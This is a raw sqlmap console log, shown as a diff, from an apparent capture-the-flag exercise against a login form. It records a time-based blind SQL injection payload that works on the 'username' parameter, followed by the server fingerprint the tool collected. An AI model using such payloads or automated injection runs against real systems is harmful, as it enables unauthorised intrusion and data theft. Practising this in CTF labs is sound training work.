@@ -1,0 +1,53 @@
+PS D:\1111_work\1111attack_and_defense\sqlmap> py .\sqlmap.py --wizard
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.12.7#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:50:35 /2022-12-21/
+
+[11:50:35] [INFO] starting wizard interface
+Please enter full target URL (-u): http://ctf.adl.tw:12003/
+POST data (--data) [Enter for None]:
+
+[11:51:05] [WARNING] no GET and/or POST parameter(s) found for testing (e.g. GET parameter 'id' in 'http://www.site.com/vuln.php?id=1'). Will search for forms
+Injection difficulty (--level/--risk). Please choose:
+[1] Normal (default)
+[2] Medium
+[3] Hard
+> 3
+Enumeration (--banner/--current-user/etc). Please choose:
+[1] Basic (default)
+[2] Intermediate
+[3] All
+> 3
+
+sqlmap is running, please wait..
+
+[1/1] Form:
+POST http://ctf.adl.tw:12003/
+POST data: username=&password=&submit=
+do you want to test this form? [Y/n/q]
+> Y
+Edit POST data [default: username=&password=&submit=] (Warning: blank fields detected): username=&password=&submit=
+do you want to fill blank fields with random values? [Y/n] Y
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 5338 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: username=eBpr' RLIKE SLEEP(5)-- itvC&password=&submit=OPis
+---
+do you want to exploit this SQL injection? [Y/n] Y
+web server operating system: Linux Debian
+web application technology: Apache 2.4.54, PHP 7.4.33
+back-end DBMS: MySQL >= 5.0.12
+[11:58:41] [ERROR] unable to retrieve the number of database users, skipping to the next target
+
+[*] ending @ 11:58:41 /2022-12-21/
